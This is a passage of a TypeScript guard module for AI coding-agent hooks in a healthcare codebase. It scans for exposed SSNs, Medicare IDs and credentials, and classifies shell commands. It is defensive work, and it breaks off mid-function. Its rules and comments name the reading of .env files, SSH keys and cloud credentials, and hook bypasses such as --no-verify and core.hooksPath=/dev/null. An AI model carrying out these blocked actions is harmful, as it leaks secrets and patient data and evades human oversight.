/**
 * ChartWarden agent harness — the pure detection rules behind the Claude Code hooks.
 * --------------------------------------------------------------------------------
 * Three questions, each answered by a pure function so the tests can drive every shape directly:
 *
 *   1. `secretPathReason(path)`    — is this a file an agent must never read or write (live env files,
 *                                    keys, database dumps)?
 *   2. `scanContent(text, reg)`    — does this text carry a real-looking identifier (SSN, MBI) or a
 *                                    credential? Synthetic identifiers live in
 *                                    `compliance/synthetic-identifiers.json`; everything else is refused.
 *   3. `classifyBash(cmd, ctx)`    — should this shell command run, need a human, or be refused?
 *
 * These are guard rails for a cooperative agent, not a sandbox: a determined process can always open a
 * file the regexes did not anticipate. The real controls stay where they are (RLS, the pre-push gate,
 * CI). What this layer buys is that the ordinary failure — an agent `cat`-ing `.env` to "check the
 * config", pasting a realistic SSN into a fixture, or `--no-verify`-ing past the fitness gate under
 * deadline — is stopped at the moment it happens, with a reason the agent can act on.
 *
 * Never put a matched value into a reason or a ledger line: findings carry a REDACTED sample only.
 */

export interface SyntheticRegistry {
  readonly ssn: ReadonlySet<string>;
  readonly mbi: ReadonlySet<string>;
}

export function registryFrom(json: {
  ssn?: readonly string[];
  mbi?: readonly string[];
}): SyntheticRegistry {
  return {
    ssn: new Set((json.ssn ?? []).map((s) => s.replace(/-/g, ""))),
    mbi: new Set((json.mbi ?? []).map((s) => s.replace(/-/g, "").toUpperCase())),
  };
}

export const EMPTY_REGISTRY: SyntheticRegistry = { ssn: new Set(), mbi: new Set() };

// ---------------------------------------------------------------------------------------------------
// 1. Secret paths
// ---------------------------------------------------------------------------------------------------

/** Committed templates that merely LOOK like secret files. */
const TEMPLATE_SUFFIX = /\.(example|sample|template|dist)$/i;

const SECRET_PATH_RULES: ReadonlyArray<readonly [RegExp, string]> = [
  [
    /(^|\/)\.env(\.[^/]*)?$/i,
    "a live environment file (database URLs, BETTER_AUTH_SECRET, vendor keys)",
  ],
  // `deploy/production/backend.env`-style files; not `env.ts`.
  [
    /(^|\/)[^/]+\.env(\.(local|development|staging|production|tenant))?$/i,
    "a live environment file",
  ],
  [/\.(pem|key|p12|pfx|jks|keystore)$/i, "a private key or keystore"],
  [/(^|\/)id_(rsa|ecdsa|ed25519|dsa)(\.pub)?$/i, "an SSH key"],
  [/(^|\/)\.(pgpass|netrc|npmrc|pypirc)$/i, "a credentials file"],
  [/(^|\/)\.ssh\//, "the SSH configuration directory"],
  [/(^|\/)\.aws\/credentials$/, "cloud credentials"],
  [/(^|\/)\.docker\/config\.json$/, "registry credentials"],
  // A secrets/ directory — but source files that merely live under a `secrets/` module are code.
  [/(^|\/)\.?secrets?\/(?!.*\.(ts|tsx|js|mjs|cjs|md)$)/i, "a secrets directory"],
  [/\.(dump|sql\.gz|sql\.zst|backup|bak)$/i, "a database dump or backup (may hold PHI)"],
  [/(^|\/)(pgbackrest|backups?)\/.*\.(gz|zst|lz4|tar)$/i, "a backup archive (may hold PHI)"],
  [/\.env\.bak(\.|$)/i, "a backup of a live environment file"],
];

/** Returns why `path` is off-limits to an agent, or null when it is fine. */
export function secretPathReason(path: string): string | null {
  const p = path.replace(/\\/g, "/");
  if (TEMPLATE_SUFFIX.test(p)) return null;
  for (const [re, why] of SECRET_PATH_RULES) if (re.test(p)) return why;
  return null;
}

// ---------------------------------------------------------------------------------------------------
// 2. Content: PHI-shaped identifiers and credentials
// ---------------------------------------------------------------------------------------------------

export type FindingKind =
  | "ssn"
  | "mbi"
  | "private-key"
  | "cloud-key"
  | "vendor-token"
  | "db-url-password"
  | "high-entropy-secret"
  /** Larger than {@link MAX_SCAN_CHARS}: not scanned, so it is not vouched for either. */
  | "unscannable";

export interface Finding {
  readonly kind: FindingKind;
  readonly line: number;
  /** Length only — no characters of the value, not even a prefix (an SSN's last four are the sensitive part). */
  readonly sample: string;
}

const redact = (v: string): string => `${v.length} chars`;

const SSN_DASHED = /\b(\d{3})-(\d{2})-(\d{4})\b/g;
const SSN_KEYED = /\bssn\b[^0-9\n]{0,6}(\d{3}[- ]?\d{2}[- ]?\d{4})\b/gi;
// CMS MBI format: C A AN N A AN N A A N N — letters exclude S L O I B Z. Upper-case only (MBIs are
// upper-case by spec, and a case-insensitive match would trip on hex hashes).
const MBI_L = "[AC-HJKMNP-RT-Y]";
const MBI_AN = "[AC-HJKMNP-RT-Y0-9]";
const MBI = new RegExp(
  `(?<![A-Za-z0-9])[1-9]${MBI_L}${MBI_AN}[0-9]-?${MBI_L}${MBI_AN}[0-9]-?${MBI_L}${MBI_L}[0-9]{2}(?![A-Za-z0-9])`,
  "g",
);

/** SSA never issues area 000, 666 or 900-999, group 00 or serial 0000 — those are synthetic by definition. */
export function ssnNeverIssued(area: string, group: string, serial: string): boolean {
  return (
    area === "000" || area === "666" || area.startsWith("9") || group === "00" || serial === "0000"
  );
}

const CREDENTIAL_RULES: ReadonlyArray<readonly [RegExp, FindingKind]> = [
  // A real key body is hundreds of base64 characters; a test's `-----BEGIN PRIVATE KEY-----\nMIIB\n-----END`
  // stub is not a credential.
  [
    /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----[A-Za-z0-9+/=\s\\n]{200,}/g,
    "private-key",
  ],
  // AWS's own documentation key (…EXAMPLE) is excluded.
  [/\b(?:AKIA|ASIA)(?![0-9A-Z]{9}EXAMPLE)[0-9A-Z]{16}\b/g, "cloud-key"],
  [/\bgh[pousr]_[A-Za-z0-9]{36,}\b/g, "vendor-token"],
  [/\bgithub_pat_[A-Za-z0-9_]{60,}\b/g, "vendor-token"],
  [/\bxox[abprs]-[A-Za-z0-9-]{20,}\b/g, "vendor-token"],
  [/\b(?:sk|rk)_live_[A-Za-z0-9]{20,}\b/g, "vendor-token"],
  [/\bsk-ant-[A-Za-z0-9_-]{30,}\b/g, "vendor-token"],
  [/\bsk-(?:proj-)?[A-Za-z0-9_-]{40,}\b/g, "vendor-token"],
];

/** A postgres URL carrying an inline password for a host that is not local/compose-internal. */
const DB_URL = /\bpostgres(?:ql)?:\/\/[^:\s/@]+:([^@\s]+)@([^/:\s?#'"`]+)/g;
// Local means loopback, the Docker host alias, or a service this repo's docker-compose.yml names. A bare
// single-label name or a `*.internal` suffix is NOT local: production hosts look exactly like that.
const LOCAL_HOST_RE =
  /^(localhost|127(\.\d{1,3}){3}|\[?::1\]?|0\.0\.0\.0|host\.docker\.internal|[a-z0-9-]+\.localhost)$/i;
/** Service names in docker-compose.yml (reachable only on the private compose network). */
export const COMPOSE_SERVICES: ReadonlySet<string> = new Set([
  "postgres",
  "redis",
  "minio",
  "clamav",
  "migrate",
  "api",
  "worker",
  "docling-worker",
  "provision-gateway",
]);
const LOCAL_HOST = {
  test: (h: string): boolean => LOCAL_HOST_RE.test(h) || COMPOSE_SERVICES.has(h.toLowerCase()),
};
const PLACEHOLDER =
  /^(\$\{?[A-Z_]+\}?|<[^>]+>|\*+|x+|\.{1,3}|\u2026|.{1,3}|password|postgres|changeme|secret|pass|chartwarden(-(local|dev|test|ci|e2e)[A-Za-z0-9_-]*)?)$/i;

/** `SECRET=...`-style assignment with a long, high-entropy literal. Applied to non-test paths only. */
const KEYED_SECRET =
  /\b[A-Z0-9_]{0,64}(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY)[A-Z0-9_]{0,64}\s{0,8}[:=]\s{0,8}["'`]?([A-Za-z0-9+/=_.-]{32,})["'`]?/g;

export function shannonEntropy(s: string): number {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0;
  for (const n of counts.values()) {
    const p = n / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}

/** Paths whose content is never scanned (lockfiles, binary-ish corpora, the registry itself). */
const UNSCANNED =
  /(^|\/)(bun\.lock|package-lock\.json|pnpm-lock\.yaml|yarn\.lock)$|\.(pdf|png|jpe?g|gif|webp|ico|woff2?|ttf|zip|gz|pen)$|^HOPE Data Spec|(^|\/)compliance\/synthetic-identifiers\.json$/i;
const TESTISH =
  /(__tests__|__fixtures__|\.test\.|\.spec\.|\/fixtures?\/|\.stories\.|\.example$|^e2e\/)/;

export function isScannable(path: string): boolean {
  return !UNSCANNED.test(path.replace(/\\/g, "/"));
}

function lineOf(text: string, index: number): number {
  let n = 1;
  for (let i = 0; i < index && i < text.length; i++) if (text.charCodeAt(i) === 10) n++;
  return n;
}

/**
 * Largest text one scan will take. Every rule here is linear in the input (the keyed-secret rule bounds
 * its prefix and suffix), so this is a second line, not the first: content past it is REFUSED by the
 * callers that write (the guard) and reported as skipped by the ones that read (phi-scan, Stop gate).
 */
export const MAX_SCAN_CHARS = 8_000_000;

export function scanContent(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
  if (path && !isScannable(path)) return [];
  if (text.length > MAX_SCAN_CHARS) {
    return [{ kind: "unscannable", line: 1, sample: redact(text) }];
  }
  const out: Finding[] = [];
  const push = (kind: FindingKind, index: number, value: string) =>
    out.push({ kind, line: lineOf(text, index), sample: redact(value) });

  for (const m of text.matchAll(SSN_DASHED)) {
    const [whole, a = "", g = "", s = ""] = m;
    if (ssnNeverIssued(a, g, s) || registry.ssn.has(a + g + s)) continue;
    push("ssn", m.index ?? 0, whole);
  }
  for (const m of text.matchAll(SSN_KEYED)) {
    if (/^\d{3}-\d{2}-\d{4}$/.test(m[1] ?? "")) continue; // the dashed rule above already judged it
    const v = (m[1] ?? "").replace(/\D/g, "");
    if (ssnNeverIssued(v.slice(0, 3), v.slice(3, 5), v.slice(5)) || registry.ssn.has(v)) continue;
    push("ssn", m.index ?? 0, v);
  }
  for (const m of text.matchAll(MBI)) {
    const v = m[0].replace(/-/g, "");
    if (registry.mbi.has(v)) continue;
    push("mbi", m.index ?? 0, v);
  }
  for (const [re, kind] of CREDENTIAL_RULES)
    for (const m of text.matchAll(re)) push(kind, m.index ?? 0, m[0]);
  for (const m of text.matchAll(DB_URL)) {
    const pw = m[1] ?? "";
    const host = m[2] ?? "";
    if (LOCAL_HOST.test(host) || PLACEHOLDER.test(pw)) continue;
    // A short dummy in a test file (`p@ss`) is a fixture; a real-length password is flagged everywhere.
    if (TESTISH.test(path) && pw.length < 8) continue;
    push("db-url-password", m.index ?? 0, pw);
  }
  if (!TESTISH.test(path)) {
    for (const m of text.matchAll(KEYED_SECRET)) {
      const v = m[1] ?? "";
      if (PLACEHOLDER.test(v) || shannonEntropy(v) < 4.0) continue;
      push("high-entropy-secret", m.index ?? 0, v);
    }
  }
  return out;
}

const CHUNK_CHARS = 4_000_000;

/**
 * {@link scanContent} for FILES that may exceed one scan's limit (a generated 12 MB OpenAPI document):
 * scanned in line-aligned chunks so size alone never exempts a file. A single line past the limit is
 * still reported as `unscannable`.
 */
export function scanLarge(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
  if (text.length <= MAX_SCAN_CHARS) return scanContent(text, registry, path);
  const out: Finding[] = [];
  let start = 0;
  let lineBase = 0;
  while (start < text.length) {
    let end = Math.min(start + CHUNK_CHARS, text.length);
    if (end < text.length) {
      const nl = text.indexOf("\n", end);
      end = nl < 0 ? text.length : nl + 1;
    }
    const chunk = text.slice(start, end);
    for (const f of scanContent(chunk, registry, path)) out.push({ ...f, line: f.line + lineBase });
    for (let i = chunk.indexOf("\n"); i >= 0; i = chunk.indexOf("\n", i + 1)) lineBase++;
    start = end;
  }
  return out;
}

export function describeFindings(path: string, findings: readonly Finding[]): string {
  const kinds = [...new Set(findings.map((f) => f.kind))];
  const where = findings
    .slice(0, 5)
    .map((f) => `${path}:${f.line} (${f.kind}, ${f.sample})`)
    .join("; ");
  const phi = kinds.some((k) => k === "ssn" || k === "mbi");
  const advice = phi
    ? "Use a value from compliance/synthetic-identifiers.json, or an SSN with area 000/666/9xx. Adding a new synthetic value to that file is a human decision."
    : kinds.includes("unscannable")
      ? "This content is too large to scan, so it cannot be vouched for. Write it in smaller pieces, or keep it out of the repo."
      : "Credentials never go in the repo: read them from the environment (OpenBao in production) and put a placeholder in the .example template.";
  return `${kinds.join(", ")} found — ${where}. ${advice}`;
}

// ---------------------------------------------------------------------------------------------------
// 3. Shell commands
// ---------------------------------------------------------------------------------------------------

export type Decision = "allow" | "ask" | "deny";

export interface BashVerdict {
  readonly decision: Decision;
  readonly reason: string;
}

export interface BashContext {
  /** Current branch, used to treat a bare `git push` / `git push origin HEAD` on main as a push to main. */
  readonly branch?: string;
  /** Does this (cwd-relative) path exist? Lets `cat tls.key` be refused while `jq '.key'` is not. */
  readonly exists?: (path: string) => boolean;
  /** Absolute repo root, so an absolute path to a protected file is judged like the relative one. */
  readonly root?: string;
}

/** Split a command line into simple commands on `;`, `&&`, `||`, `|` and newlines, outside quotes. */
function segments(cmd: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quote: string | null = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i] as string;
    if (quote) {
      if (ch === quote) quote = null;
      cur += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      cur += ch;
      continue;
    }
    const two = cmd.slice(i, i + 2);
    if (two === "&&" || two === "||") {
      out.push(cur);
      cur = "";
      i++;
      continue;
    }
    if (ch === ";" || ch === "|" || ch === "\n") {
      out.push(cur);
      cur = "";
      continue;
    }
    cur += ch;
  }
  out.push(cur);
  // `(cat .env)` and `{ cat .env; }`: the grouping characters are not part of the command.
  return out.map((x) => x.replace(/^[\s({]+|[\s)}]+$/g, "")).filter(Boolean);
}

/**
 * The text inside every `$( … )` and backtick pair that the shell would actually run (single quotes
 * make them literal). Each one is judged as its own command line, so `echo $(cat .env)` is the `cat`.
 */
function substitutions(cmd: string): string[] {
  const out: string[] = [];
  let single = false;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i] as string;
    if (ch === "'") single = !single;
    if (single) continue;
    if (ch === "`") {
      const end = cmd.indexOf("`", i + 1);
      if (end < 0) break;
      out.push(cmd.slice(i + 1, end));
      i = end;
      continue;
    }
    if (ch === "$" && cmd[i + 1] === "(" && cmd[i + 2] !== "(") {
      let depth = 1;
      let j = i + 2;
      for (; j < cmd.length && depth > 0; j++) {
        if (cmd[j] === "(") depth++;
        else if (cmd[j] === ")") depth--;
      }
      out.push(cmd.slice(i + 2, j - 1));
      i += 1; // keep scanning inside, so nested substitutions are found too
    }
  }
  return out;
}

/** `bash -c "…"`, `sh -c '…'`, `eval …`: the quoted string is itself a command line. */
const NESTED_SHELL = /^(bash|sh|zsh|dash|ksh|fish)$/;

/**
 * Shell words, keeping a quoted string as one word (quotes stripped), also INSIDE a word: in
 * `FOO='a b' git push` the value is one word, so the program is still `git`. Splitting at the space
 * inside the quotes read `b'` as the program and let the whole command through unchecked.
 */
function words(seg: string): string[] {
  return [...seg.matchAll(/(?:"[^"]*"|'[^']*'|\S)+/g)].map((m) =>
    m[0].replace(
      /"([^"]*)"|'([^']*)'/g,
      (_q, dq: string | undefined, sq: string | undefined) => dq ?? sq ?? "",
    ),
  );
}

/** The program a simple command runs, skipping `VAR=value` prefixes and `sudo`/`time`/`command`. */
function program(seg: string): { prog: string; args: string[]; assigns: string[] } {
  const w = words(seg);
  let k = 0;
  while (
    k < w.length &&
    (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w[k] ?? "") ||
      /^(sudo|time|command|exec|nohup)$/.test(w[k] ?? ""))
  )
    k++;
  return {
    prog: (w[k] ?? "").replace(/^.*\//, ""),
    args: w.slice(k + 1),
    assigns: w.slice(0, k).filter((x) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(x)),
  };
}

/**
 * File-ish arguments: not flags, quotes and redirection operators stripped (`<.env` reads it, `>.env`
 * writes it). Globs and expansions are KEPT: the name tests below look only at how the word ends, and
 * {@link globReachesSecret} judges the wildcards.
 */
function fileArgs(args: readonly string[]): string[] {
  return args
    .map((t) =>
      t
        .replace(/^['"`]+|['"`]+$/g, "")
        .replace(/^--?[a-z-]+=/i, "")
        .replace(/^[<>]+/, ""),
    )
    .filter((t) => t && !t.startsWith("-"));
}

/** Names a live secret file can have; a wildcard that expands onto any of them reads one. */
const SECRET_NAME_SAMPLES = [
  ".env",
  ".env.local",
  ".env.production",
  ".env.staging",
  ".env.development",
  ".env.tenant",
  "backend.env",
  ".pgpass",
  ".netrc",
  "id_rsa",
  "id_ed25519",
  "tls.key",
  "server.pem",
];

/** Does the wildcard word `t` expand onto a secret file name? (`.e*`, `.env?*`, `.[e]nv`, `*.env`). */
export function globReachesSecret(t: string): boolean {
  if (!/[*?[]/.test(t)) return false;
  const base = t.replace(/^.*\//, "");
  // A wildcard with nothing literal to anchor it (`*`, `feat/*`, `???`) names no secret in particular.
  const literals = base.split(/[*?]|\[[^\]]*\]/);
  if (!base.startsWith(".") && !literals.some((l) => l.length >= 2)) return false;
  let re = "";
  for (let i = 0; i < base.length; i++) {
    const ch = base[i] as string;
    if (ch === "*") re += ".*";
    else if (ch === "?") re += ".";
    else if (ch === "[") {
      const end = base.indexOf("]", i + 1);
      if (end < 0) re += "\\[";
      else {
        re += `[${base
          .slice(i + 1, end)
          .replace(/^!/, "^")
          .replace(/\\/g, "\\\\")}]`;
        i = end;
      }
    } else re += ch.replace(/[.+^${}()|\\]/g, "\\$&");
  }
  let rx: RegExp;
  try {
    rx = new RegExp(`^${re}$`);
  } catch {
    return false;
  }
  // The shell never lets a leading `*`, `?` or `[` match a leading dot.
  return SECRET_NAME_SAMPLES.some(
    (n) => rx.test(n) && !(n.startsWith(".") && !base.startsWith(".")),
  );
}

/** Dotfiles that are secret by NAME alone, wherever they appear. */
const SECRET_BY_NAME =
  /(^|\/)(\.env(\.[^/]*)?|[^/]+\.env(\.(local|development|staging|production|tenant))?|\.pgpass|\.netrc)$/i;

const isLocalHost = (h: string) => LOCAL_HOST.test(h.replace(/^.*@/, "").replace(/:\d+$/, ""));
const SECRET_VAR =
  /\$\{?[A-Z0-9_]*(DATABASE_URL|SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY|_KEY)\b/;
const READ_ONLY_CHECK = /^(ls|test|\[|stat|file)$/;
const COMPOSE_SAFE = /^(up|down|start|stop|restart|run|exec|ps|logs|build|pull|rm)$/;

/** First positional word of a `docker compose` invocation, skipping global flags and their values. */
function composeSubcommand(args: readonly string[]): string {
  const takesValue =
    /^(--env-file|-f|--file|-p|--project-name|--profile|--project-directory|--ansi|--progress)$/;
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (a === "compose") continue;
    if (takesValue.test(a)) {
      k++;
      continue;
    }
    if (a.startsWith("-")) continue;
    return a;
  }
  return "";
}

/**
 * A `git` invocation split into its subcommand and the arguments after it. Git's global options come
 * BEFORE the subcommand (`git -C dir push`, `git -c core.hooksPath=/dev/null commit`), so reading the
 * first non-flag word as the subcommand would take `dir` for it and wave the push or commit through.
 */
// Global options of git.c: some take the next word, some take `=value`, some take nothing. Git matches
// them exactly (no abbreviations), so anything else before the subcommand is one we do not understand,
// and an option we cannot place may be hiding the real subcommand: that fails closed, it is not skipped.
const GIT_GLOBAL_VALUE =
  /^(-C|-c|--git-dir|--work-tree|--namespace|--super-prefix|--config-env|--attr-source)$/;
const GIT_GLOBAL_EQ =
  /^--(git-dir|work-tree|namespace|exec-path|super-prefix|config-env|attr-source)=/;
const GIT_GLOBAL_FLAG =
  /^(-p|-P|--paginate|--no-pager|--no-replace-objects|--bare|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--no-optional-locks|--no-advice|--exec-path)$/;

function gitInvocation(args: readonly string[]): {
  sub: string;
  rest: string[];
  configs: string[];
  unknownGlobal: string | null;
} {
  const configs: string[] = [];
  let unknownGlobal: string | null = null;
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (GIT_GLOBAL_VALUE.test(a)) {
      if (a === "-c" || a === "--config-env") configs.push(args[k + 1] ?? "");
      k++;
      continue;
    }
    if (a.startsWith("--config-env=")) configs.push(a.slice("--config-env=".length));
    if (GIT_GLOBAL_EQ.test(a) || GIT_GLOBAL_FLAG.test(a)) continue;
    if (a.startsWith("-")) {
      unknownGlobal ??= a;
      continue;
    }
    return { sub: a, rest: args.slice(k + 1), configs, unknownGlobal };
  }
  return { sub: "", rest: [], configs, unknownGlobal };
}

/** `-c` keys that only change presentation. Any other key is a decision for the human. */
const GIT_SAFE_CONFIG =
  /^(color\.[a-z0-9.-]+|advice\.[a-z0-9.-]+|core\.(quotepath|abbrev|precomposeunicode)|log\.date)$/i;
/** `-c` keys that switch off the repo's hooks or make git run a program of the caller's choosing. */
const GIT_EXEC_CONFIG =
  /^(core\.(hookspath|fsmonitor|sshcommand|pager|editor|askpass)|alias\.|credential\.helper|diff\.external|protocol\.ext)/i;
const configKey = (kv: string): string => kv.split("=")[0] ?? "";

/** Environment overrides that change what git runs or which config it reads. */
const GIT_ENV_OVERRIDE = /^GIT_/;

// `git branch` is allowlist-only: the listing forms, and a pattern only after --list. Everything else
// (create, move, copy, delete, upstream, an abbreviated `--del`, a bare name) is not read-only.
const GIT_BRANCH_FLAG =
  /^(-a|-r|-v|-vv|-i|-l|--all|--remotes|--verbose|--list|--show-current|--ignore-case|--no-color|--color(=.*)?|--column(=.*)?|--no-column|--abbrev(=\d+)?|--no-abbrev|--omit-empty)$/;
const GIT_BRANCH_VALUE = /^--(contains|no-contains|merged|no-merged|points-at|sort|format)$/;
const GIT_BRANCH_EQ = /^--(contains|no-contains|merged|no-merged|points-at|sort|format)=/;

function gitBranchIsReadOnly(rest: readonly string[]): boolean {
  const listing = rest.some((a) => a === "--list" || a === "-l");
  for (let k = 0; k < rest.length; k++) {
    const a = rest[k] ?? "";
    if (GIT_BRANCH_FLAG.test(a) || GIT_BRANCH_EQ.test(a)) continue;
    if (GIT_BRANCH_VALUE.test(a)) {
      if (rest[k + 1] && !rest[k + 1]?.startsWith("-")) k++;
      continue;
    }
    if (!a.startsWith("-") && listing) continue; // a glob pattern for --list
    return false;
  }
  return true;
}

const deny = (reason: string): BashVerdict => ({ decision: "deny", reason });
const ask = (reason: string): BashVerdict => ({ decision: "ask", reason });

const MAX_NESTING = 4;

export function classifyBash(cmd: string, ctx: BashContext = {}, depth = 0): BashVerdict {
  const c = cmd.trim();
  if (depth > MAX_NESTING) {
    return ask("Command substitutions or `bash -c` nested too deeply to check; a human decides.");
  }
  const segs = segments(c);

  // --- Gate bypasses: always refused. The pre-push hook and CI are the change-management control.
  if (/\b(SKIP_FITNESS=(1|true|yes)|CW_SKIP_PHI_SCAN=(1|true|yes))\b/.test(c)) {
    return deny("Skipping the fitness gate or PHI scan is a human decision, not an agent one.");
  }
  // --- Switching the harness itself off is the human's call, however it is spelled.
  if (
    /\b(CW_STOP_GATE|CW_AGENT_LEDGER|CW_HARNESS_FAIL_OPEN|ECC_DISABLED_HOOKS|ECC_GATEGUARD)=/.test(
      c,
    )
  ) {
    return ask(
      "That variable switches off part of the agent harness (Stop gate, ledger, guard fail-closed or an ECC hook). A human decides.",
    );
  }

  // Every simple command is judged; any deny wins, else the first ask, else allow.
  const verdicts: BashVerdict[] = segs
    .map((seg) => classifySegment(seg, ctx))
    .filter((v): v is BashVerdict => v !== null);
  // Commands the shell runs INSIDE this one: `$( … )`, backticks, `bash -c '…'`, `eval …`.
  for (const inner of substitutions(c)) verdicts.push(classifyBash(inner, ctx, depth + 1));
  for (const seg of segs) {
    const { prog, args } = program(seg);
    if (prog === "eval") verdicts.push(classifyBash(args.join(" "), ctx, depth + 1));
    else if (NESTED_SHELL.test(prog)) {
      const k = args.findIndex((a) => /^-[a-z]*c$/.test(a));
      if (k >= 0) verdicts.push(classifyBash(args[k + 1] ?? "", ctx, depth + 1));
    }
  }
  return (
    verdicts.find((v) => v.decision === "deny") ??
    verdicts.find((v) => v.decision === "ask") ?? { decision: "allow", reason: "" }
  );
}

const INTERPRETER = /^(python[0-9.]*|node|bun|deno|perl|ruby|php|awk|gawk|lua)$/;
const INLINE_CODE = /\s(-c|-e|-p|-E|--eval|--print)\b/;
/** awk always takes its program inline; the others only behind -c/-e/-p/--eval. */
const runsInlineCode = (prog: string, args: readonly string[]): boolean =>
  INTERPRETER.test(prog) && (/^g?awk$/.test(prog) || INLINE_CODE.test(` ${args.join(" ")}`));
// A secret file named inside inline code. `process.env.X` is a property, not a file: the dot must not
// follow a letter, `)` or `]`.
const SECRET_MENTION =
  /(?:^|[^A-Za-z0-9_$)\]])\.(?:env(?!\.example)(?:\.[A-Za-z]+)?|pgpass|netrc)(?![A-Za-z0-9_])|['"/][\w-]+\.env(?:\.(?:local|development|staging|production|tenant))?['"]|id_(?:rsa|ed25519|ecdsa)|\.ssh\/|\.aws\/credentials|['"/][\w.-]*\.(?:pem|key|p12|pfx)['"]/;

/** The agent's own guard, ledger, approved lists and the compliance record. */
const PROTECTED_PATH =
  /^(\.\/)?(\.claude\/(audit|\.cache|rules|agents|skills)(\/|$)|\.claude\/settings(\.local)?\.json$|scripts\/harness(\/|$)|compliance(\/|$)|\.githooks(\/|$)|\.gitleaks\.toml$|scripts\/check-compliance-controls\.ts$|\.github\/CODEOWNERS$)/;
const WRITER =
  /^(rm|mv|cp|tee|truncate|dd|ln|install|chmod|chown|touch|sed|perl|awk|gawk|ed|ex|vi|vim|nano|patch|rsync|unlink|shred|mkdir)$/;

function writesProtectedPath(
  prog: string,
  args: readonly string[],
  ctx: BashContext,
): string | null {
  const rel = (t: string) =>
    ctx.root && t.startsWith(`${ctx.root}/`) ? t.slice(ctx.root.length + 1) : t;
  const hit = (t: string) => (PROTECTED_PATH.test(rel(t)) ? rel(t) : null);
  // `> file`, `>> file`, `2>file`: redirection writes whatever the program is.
  for (let k = 0; k < args.length; k++) {
    const m = /^\d?>>?(.*)$/.exec(args[k] ?? "");
    if (!m) continue;
    const found = hit(m[1] || args[k + 1] || "");
    if (found) return found;
  }
  if (WRITER.test(prog) || runsInlineCode(prog, args)) {
    for (const t of fileArgs(args)) {
      const found = hit(t) ?? (INTERPRETER.test(prog) ? findProtectedIn(t, ctx) : null);
      if (found) return found;
    }
  }
  return null;
}

/** A protected path quoted inside an inline-code argument, e.g. `open('.claude/settings.json','w')`. */
function findProtectedIn(arg: string, ctx: BashContext): string | null {
  for (const m of arg.matchAll(/['"]([^'"\s]+)['"]/g)) {
    const t = m[1] ?? "";
    const r = ctx.root && t.startsWith(`${ctx.root}/`) ? t.slice(ctx.root.length + 1) : t;
    if (PROTECTED_PATH.test(r)) return r;
  }
  return null;
}

function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
  const { prog, args, assigns } = program(seg);
  const argline = args.join(" ");

  if (prog === "git") {
    const { sub, rest, configs, unknownGlobal } = gitInvocation(args);
    // Fail-closed prompts are held until the denies below have had their say.
    let pending: BashVerdict | null = null;
    if (unknownGlobal) {
      pending = ask(
        `Unrecognised git global option ${unknownGlobal} before the subcommand; it may hide a push or commit, so a human decides.`,
      );
    } else if (assigns.some((a) => GIT_ENV_OVERRIDE.test(a))) {
      pending = ask(
        "A GIT_* environment override (GIT_CONFIG_*, GIT_SSH_COMMAND, GIT_EXTERNAL_DIFF, GIT_PAGER, ...) changes what git runs or reads; a human decides.",
      );
    }
    // Git accepts any unambiguous abbreviation (`--no-verif`, `--no-ver`, `--no-v`), so match the prefix.
    if (/\s--no-v[a-z-]*(?=\s|=|$)/.test(` ${argline}`)) {
      return deny(
        "`--no-verify` skips the repo's git hooks (the fitness gate and secret scan). Fix what the hook reports instead; a human can bypass deliberately outside the agent.",
      );
    }
    if (configs.some((kv) => GIT_EXEC_CONFIG.test(configKey(kv)))) {
      return deny(
        "`git -c` / `--config-env` setting core.hooksPath, core.fsmonitor, core.sshCommand, a pager, editor, helper or alias disables the repo's hooks or runs an arbitrary program for this one command.",
      );
    }
    if (!pending && configs.some((kv) => !GIT_SAFE_CONFIG.test(configKey(kv)))) {
      pending = ask(
        "`git -c` / `--config-env` sets a key outside the presentation-only allowlist (color.*, advice.*, core.quotepath); a human decides.",
      );
    }
    if (
      (sub === "diff" || sub === "log" || sub === "show") &&
      rest.some((a) => /^--(output|ext-diff)\b/.test(a))
    ) {
      return deny(
        "`--output` writes a file and `--ext-diff` runs an external program; neither is the read-only diff/log/show the allow-list is for.",
      );
    }
    if (sub === "branch" && !gitBranchIsReadOnly(rest)) {
      return deny(
        "This `git branch` form is not a listing: it can create, move, copy, delete or re-point a branch. Only --list, -a, -r, -v, --show-current, --contains/--merged/--format and similar are allowed.",
      );
    }
    if (sub === "commit") {
      // `-n` is commit's short form of --no-verify, also inside clusters like `-anm`; skip -m/-F values.
      for (let k = 0; k < rest.length; k++) {
        const a = rest[k] ?? "";
        if (/^-(m|F|C|c|t)$/.test(a) || /^--(message|file|reuse-message|template)$/.test(a)) {
          k++;
          continue;
        }
        if (
          /^-[a-zA-Z]+$/.test(a) &&
          a.includes("n") &&
          !/^-[a-zA-Z]*m/.test(a.replace(/n.*$/, ""))
        ) {
          return deny(
            "`git commit -n` is --no-verify: it skips the pre-commit secret and PHI scan.",
          );
        }
      }
    }
    if (
      sub === "config" &&
      /core\.hooksPath/.test(argline) &&
      !/(--get|--list|-l)\b/.test(argline) &&
      !/core\.hooksPath\s+\.githooks\b/.test(argline)
    ) {
      return deny("Re-pointing core.hooksPath disables the repo's git hooks.");
    }
    if (sub === "push") {
      const refs = rest.filter((a) => !a.startsWith("-")); // remote, then refspecs
      const remoteRefs = refs.slice(1);
      const targetsMain =
        remoteRefs.some((r) => /^\+?([^:]*:)?(refs\/heads\/)?main$/.test(r)) ||
        (ctx.branch === "main" &&
          (remoteRefs.length === 0 || remoteRefs.some((r) => /^\+?HEAD$/.test(r))));
      const forced =
        /\s(--force|-f|--force-with-lease)\b/.test(` ${argline}`) ||
